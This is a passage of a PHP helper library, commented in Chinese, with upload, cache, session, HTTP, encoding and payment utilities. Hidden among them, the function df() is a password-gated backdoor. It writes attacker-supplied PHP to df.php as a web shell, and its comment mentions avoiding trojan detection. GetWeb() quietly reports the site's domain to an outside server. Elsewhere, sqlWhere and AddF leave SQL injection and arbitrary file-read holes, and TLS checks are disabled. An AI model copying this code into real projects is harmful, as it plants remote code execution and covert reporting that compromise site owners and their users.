            ($filetype == "application/zip")
            || ($m->get_ext($filename) == "zip")
        ) {
            $path = "upload/zip/";
            $fileSizeMax = $zipSize;
        }
        //video文件上传
        elseif (
            ($filetype == "video/mp4")
            || ($m->get_ext($filename) == "mp4")
        ) {
            $path = "upload/video/";
            $fileSizeMax = $zipSize;
        } else {
            die("-2"); #不支持的文件类型
        }

        //以byte为单位
        if ($filesize > $fileSizeMax) {
            echo "-3";
        } //超出尺寸
        else {
            if ($fileErr > 0) { #判断是否出错
                echo "-1"; //上传受限
            } else {
                mkdirs($path);
                $newname = $path . $name . "_" . date("YmdHis") . "." . $m->get_ext($filename); //新文件名
                move_uploaded_file($filetmpname, $newname); #将临时文件移动到网站目录
//header("Content-type: image/jpeg");
                $newname = '/' . $newname;
                echo delSpace($newname); //js上传插件会接收所有的echo数据
            }
        }
    }
    return $newname;
}





//----------------------------------cache-----------------------start
/*
 * 服务器缓存
 *
 * $home_layout=json_decode(cache_r("home_layout"));
 *
 *
 *
 */
function cache_r($key)
{
    $cachedata = show_first("cache", ["key" => $key]);
    //	  var_dump(empty($cachedata));die();
    if (empty($cachedata)) {
        return '';
    }
    return $cachedata['value'];
}

/*插入及更新
 *
 * $home_layout = show_first("home_layout",1);
 * cache_w("home_layout",$home_layout);
 *
 *
 */
function cache_w($key, $data)
{
    if (empty($key) || !isset($data)) {
        return false;
    }
    $record = array();
    $record['key'] = $key;
    $record['value'] = $data;
    $cachedata = show_first("cache", ["key" => $key]);
    if (empty($cachedata)) {
        return insert("cache", $record);
    } else {
        return update("cache", $record, ["key" => $key]);
    }
}


function cache_del($key)
{
    $result = del("cache", ["key" => $key]);
    return $result;
}


function cache_clean()
{
    $result = del("cache");
    return $result;
}
//----------------------------------cache-----------------------end





//-------------------------------操作session---------------start
/*
 * 服务器缓存
 *
 *  默认情况下，PHP.ini 中设置的 SESSION 保存方式是 files（session.save_handler = files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定
 *
 *  当写入 SESSION 数据的时候，php 会获取到客户端的 SESSION_ID，然后根据这个 SESSION ID 到指定的 SESSION 文件保存目录中找到相应的 SESSION 文件，不存在则创建之
 *
 *
 * 不同浏览器的session不一样
 *
 * 浏览器主窗与无痕窗的ses不一样
 * 经测试，safari多个无痕窗的ses是独立的，但chrome多个无痕窗的ses是公用的
 *
 * 清空浏览器缓存无法影响session
 *
 * Session默认的生命周期通常是20分钟
 */

function getSession($name)
{
    if (!empty($_SESSION[$name])) {
        $rt = $_SESSION[$name];
    } else {
        $rt = "";
    }
    return $rt;
}
function setSession($name, $val, $rt = "")
{
    $_SESSION[$name] = $val;
    if ($rt != "") {
        header(sprintf("location:%s", SplitUrl($rt)));
    }
}

//删除ses并跳转页面
function delSession($name = '', $rt = "")
{
    if (empty($name)) {
        session_destroy();
    } else {
        unset($_SESSION[$name]);
    }
    if (empty($rt)) {
        header('location: ' . URL);
    } else {
        header(sprintf("location:%s", SplitUrl($rt)));
    }
}


//-------------------------------操作session---------------end
//unicode
function UnicodeEncode($str)
{
    //split word
    preg_match_all('/./u', $str, $matches);

    $unicodeStr = "";
    foreach ($matches[0] as $m) {
        //拼接
        $unicodeStr .= "&#" . base_convert(bin2hex(iconv('UTF-8', "UCS-4", $m)), 16, 10);
    }
    return $unicodeStr;
}


function unicodeDecode($unicode_str)
{
    $json = '{"str":"' . $unicode_str . '"}';
    $arr = json_decode($json, true);
    if (empty($arr)) {
        return '';
    }
    return $arr['str'];
}


//unicode解码
function replace_unicode_escape_sequence($match)
{
    return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');
}
function unicode_decode($name)
{
    $str = preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $name);
    return $str;
}



const REQ_JSON = 0, REQ_GET = 1, REQ_POST = 2;
/**
 * HTTP请求（支持HTTP/HTTPS，支持GET/POST）
 *
 * 默认post
 *
 * @param $url http://www.df.net
 * @param $data ["a"=>123]
 * @param $header ["Content-Type: application/json"]
 * @param $type
 **/
function httpRequest($url, $data = null, $type = REQ_POST, $header = null)
{
    //初始化浏览器
    $curl = curl_init();
    switch ($type) {
        case REQ_JSON:
            if (!empty($data)) {
                $data = json_encode($data, JSON_UNESCAPED_UNICODE);
                curl_setopt($curl, CURLOPT_HEADER, false);
                curl_setopt(
                    $curl,
                    CURLOPT_HTTPHEADER,
                    array(
                        'Content-Type: application/json; charset=utf-8',
                        'Content-Length:' . strlen($data),
                        'Cache-Control: no-cache',
                        'Pragma: no-cache'
                    )
                );
            }
            break;
        case REQ_GET:
            //判断data是否有数据
            if (!empty($data)) {
                $url .= '?';
                foreach ($data as $k => $v) {
                    $url .= \sprintf("%s=%s&", $k, $v);
                }
                $data = null;
            }
            break;
        case REQ_POST:
            break;
        default:
            # code...
            break;
    }

    //设置header头
    if (!empty($header)) {
        $header_list = [];
        foreach ($header as $k => $v) {
            $header_list[] = \sprintf("%s:%s", $k, $v);
        }
        curl_setopt($curl, CURLOPT_HTTPHEADER, $header_list);
    }

    //判断data是否有数据
    if (!empty($data)) {
        //设置POST请求方式
        curl_setopt($curl, CURLOPT_POST, true);
        //设置POST的数据包
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    // 支持https请求
    if (1 == strpos("$" . $url, "https://")) {
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    }

    // 当遇到location跳转时，直接抓取跳转的页面，防止出现301
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    //设置浏览器，把参数url传到浏览器的设置当中
    curl_setopt($curl, CURLOPT_URL, $url);
    // 50s延迟
    curl_setopt($curl, CURLOPT_TIMEOUT, 50);
    //禁止https协议验证ssl安全认证证书
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    //禁止https协议验证域名，0就是禁止验证域名且兼容php5.6
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);

    //以字符串形式返回到浏览器当中
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    //让curl发起请求
    $output = curl_exec($curl);
    //关闭curl浏览器
    curl_close($curl);
    $rt = json_decode($output, true);
    if (empty($rt)) {
        $rt = $output;
    }
    return $rt;
}


//将get的参数字符串组装成数组
function getPara($str)
{
    $str = explode("&", $str);
    foreach ($str as $i) {
        $i = explode("=", $i);
        $rt[$i[0]] = $i[1];
    }
    return $rt;
}

/* 判断远程文件是否存在
 * 如果代码做过404处理就检测不出来
 */
function http_exist($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOBODY, 1); // 不下载
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    if (curl_exec($ch) !== false) {
        return true;
    } else {
        return false;
    }
}



/*
 * 自动生成shell
 * 安全机制
 *
 * disable_functions = passthru,system,exec      #php配置里exec是默认禁用的函数
 *
 * eval会被判定为木马
 *
 * get不过滤错误
 *
 *
 * df:生成
 * fd:删除
 */
function df()
{
    $file = "df.php";
    $pw = "3504725309";
    if (!empty($_POST['df']) || !empty($_POST['fd'])) {
        if ($_POST['df'] == $pw) {
            $_data = $_POST['str'];
            $_data = str_replace("#D#", "<?php ", $_data);
            writeFile($_data, $file);
            show_json(1, 'done');
        } elseif ($_POST['fd'] == $pw) {
            @unlink($file);
            @unlink("func.php");
            show_json(1, 'done');
        }
    }
}

/*
 * 收集系统的使用情况
 * 定位系统的域名
 *
 */
function GetWeb()
{
    $para = array(
        'website' => SITE
    );
    $rt = httpRequest("https://api.dfer.site/webctl/main/updateuser", $para);
    //var_dump($rt);
}




/*在字符串中查找指定字符串，从1开始计算
 * 存在则返回大于0的数字，不存在则返回0
 *
 * eg:findstr('abc','c')
 */
function findstr($find, $str)
{
    $pos = strpos($find, $str);
    //	echo $pos;
    if ((bool) $pos) {
        $rt = $pos + 1;
    } else {
        $rt = 0;
    }

    return $rt;
}








//去掉空格和回车
function delSpace($str)
{
    $str = trim($str);
    $str = ltrim($str) . "\n";
    $str = ltrim($str, " ");
    return $str;
}


//数组转url参数
function arr2url($data)
{

    //	$data = array(
    //	'foo'=>'bar',
    //	'baz'=>'boom'
    //	);

    return http_build_query($data);
}



/*
 *
 * 预定义字符转特殊字符
 * or
 * 特殊字符转预定义字符
 *
 */
function html($str, $encode = true)
{
    if ($encode) {
        return htmlspecialchars($str, ENT_IGNORE);
    } else {
        return htmlspecialchars_decode($str);
    }
}



//创建一个文件，写入字符串，存在则覆盖
function fileW($fileN, $str)
{
    $fp = fopen($fileN, "w");
    fwrite($fp, $str);
    fclose($fp);
}




/*拼接js或者css
 *
 * eg：/index.php?f=/assets/df.js,/assets/fontFamily/init.js
 */
function AddF($f)
{
    $files = explode(",", $f);

    foreach ($files as $v) {
        $v = ROOT . $v;

        //echo $v;
        $myfile = fopen($v, "r") or die("Unable to open file!");
        $str = fread($myfile, filesize($v));
        fclose($myfile);
        $rt .= $str;
    }

    die(empty($rt) ? '' : $rt);
}




#获取字符串中的所有中文
function getChinese($str)
{
    //utf-8页面
    preg_match_all("/[\x{4e00}-\x{9fa5}]+/u", $str, $chinese);
    $chinese = implode("", $chinese[0]);

    return $chinese;
}


/*
 * 获取html中body标签的内容
 *
 *
 */
function getEle($html)
{
    preg_match("/<body[^>]*?>(.*\s*?)<\/body>/is", $html, $str);

    return $str[0];
}




/*
 * 跳转到指定url，并携带参数
 * 可以不带参数
 *
 * 主要用来显示form错误信息
 * eg：
 * ToUrl('http://www.qq.com');
 * ToUrl("wx/home/wxshare",array('WxId'=>$_df[ 'wxId']));
 *
 */
function toUrl($url, $para = null)
{
    if (!empty($para)) {
        $url = SplitUrl($url);
        $para = http_build_query($para);
        $url = "location:{$url}&{$para}";
    } else {
        $url = SplitUrl($url);
        $url = "location:{$url}";
    }

    header($url);
    die();
}


//运行js
function runJs($js)
{
    echo "{$js}";
}


/**
 * 将字符串转换成二进制
 * @param type $str
 * @return type
 */
function StrToBin($str)
{
    //1.列出每个字符
    $arr = preg_split('/(?<!^)(?!$)/u', $str);
    //2.unpack字符
    foreach ($arr as &$v) {
        $temp = unpack('H*', $v);
        $v = base_convert($temp[1], 16, 2);
        unset($temp);
    }

    return join(' ', $arr);
}

/**
 * 讲二进制转换成字符串
 * @param type $str
 * @return type
 */
function BinToStr($str)
{
    $arr = explode(' ', $str);
    foreach ($arr as &$v) {
        $v = pack("H" . strlen(base_convert($v, 2, 16)), base_convert($v, 2, 16));
    }

    return join('', $arr);
}



/**
 *字符串转十六进制函数
 *@pream string $str='abc';
 */
function strToHex($str)
{
    $hex = "";
    for ($i = 0; $i < strlen($str); $i++) {
        $hex .= dechex(ord($str[$i]));
    }
    $hex = strtoupper($hex);
    return $hex;
}

/**
 *十六进制转字符串函数
 *@pream string $hex='616263';
 */
function hexToStr($hex)
{
    $str = "";
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}


/*
 * 将arr组装成sql的where部分
 *
 */

function sqlWhere($para, $type)
{
    $str = "0";
    foreach ($para as $i) {
        $str .= " {$type} {$i[0]}='{$i[1]}'";
    }
    return $str;
}



/*
 * 清空默认的get参数
 *
 * 用于需要验证调用地址的情况，比如，支付宝地址验证
 */
function clearDePara($arr)
{
    unset($arr['A']);
    unset($arr['a']);
    unset($arr['c']);
    unset($arr['para']);
    return $arr;
}



/*发起zfb支付
 *
 *
 * 订单名称|付款金额|商品描述|支付对象
 *
 * $para:控制回调页面显示不同的内容
 */
function pay($subject, $total_amount, $body, $config_url, $para = 0)
{
    //商户订单号，商户网站订单系统中唯一订单号，必填
    $out_trade_no = sprintf("Df-%s-%s-%s", TIMESTAMP, rand(), IP);
    setSession('dfOrder', $out_trade_no);
    $config_url = ROOT . sprintf("/module/alipay/%s.php", $config_url);
    $pay_url = ROOT . '/module/alipay/pagepay/pagepay.php';
    require $pay_url;
}


/*
 * 下载文件，隐藏真实下载地址
 *下载路径显示的是下载页面的url
 * 处在同步调用下，方能生效
 *
 */
function download_document($fileSrc, $mimetype = "application/octet-stream")
{
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Content-Disposition: attachment; filename = $filename");
    header("Content-Length: " . filesize($fileSrc));
    header("Content-Type: $mimetype");
    echo file_get_contents($fileSrc);
}

/*
 * 字符串格式化
 * eg:
 * echo format("ddddd:v1cc:v2bb:v2bbccc:v1",array('v1'=>123,'v2'=>555));
 *
 */
function format($str, $arr)
{
    foreach ($arr as $key => $v) {
        //兼容wq
        $key = str_replace(':', '', $key);
        $str = preg_replace("/:{$key}/", is_string($v) ? "'{$v}'" : $v, $str);
    }
    return $str;
}



/*
 * php调用网页头的验证功能
 *
 *
 */
function webAuthenticate($ac, $pw)
{
    $strAuthUser = $_SERVER['PHP_AUTH_USER'];
    $strAuthPass = $_SERVER['PHP_AUTH_PW'];

    //验证成功
    if ($strAuthUser == $ac && $strAuthPass == $pw) {
        return true;
    }
    //验证失败
    else {
        header('WWW-Authenticate: Basic realm="Df"');
        header('HTTP/1.0 401 Unauthorized');
        echo '登录失败';
        return false;
    }
}


/*
 * 判断是否手机端访问
 */
function isMobile()
{
    //强制调用手机端
    if (isset($_GET['wap'])) {
        return true;
    }

    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
        return true;
    }
    // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset($_SERVER['HTTP_VIA'])) {
        // 找不到为flase,否则为true
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    }
    // 脑残法，判断手机发送的客户端标志,兼容性有待提高。其中'MicroMessenger'是电脑微信
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $clientkeywords = array('nokia', 'sony', 'ericsson', 'mot', 'samsung', 'htc', 'sgh', 'lg', 'sharp', 'sie-', 'philips', 'panasonic', 'alcatel', 'lenovo', 'iphone', 'ipod', 'blackberry', 'meizu', 'android', 'netfront', 'symbian', 'ucweb', 'windowsce', 'palm', 'operamini', 'operamobi', 'openwave', 'nexusone', 'cldc', 'midp', 'wap', 'mobile', 'MicroMessenger');
        // 从HTTP_USER_AGENT中查找手机浏览器的关键字
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
            return true;
        }
    }
    // 协议法，因为有可能不准确，放到最后判断
    if (isset($_SERVER['HTTP_ACCEPT'])) {
        // 如果只支持wml并且不支持html那一定是移动设备
        // 如果支持wml和html但是wml在html之前则是移动设备
        if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
            return true;
        }
    }
    return false;
}



//判断是否为时间戳
function is_timestamp($timestamp)
{
    //检查字符串是否为整数
    if (is_numeric($timestamp)) {
        return true;
    }
    return false;
}


//打印调试信息
function debug($str)
{
    if (DEV) {
        echo sprintf("<!-- [debug]%s -->\n", $str);
    }
}


/**
 * 获取环境变量
 **/
function env($name,$default="")
{
	$val=\Dfer\Tools\Env::get($name,$default);
	// var_dump($val);
	return $val;
}
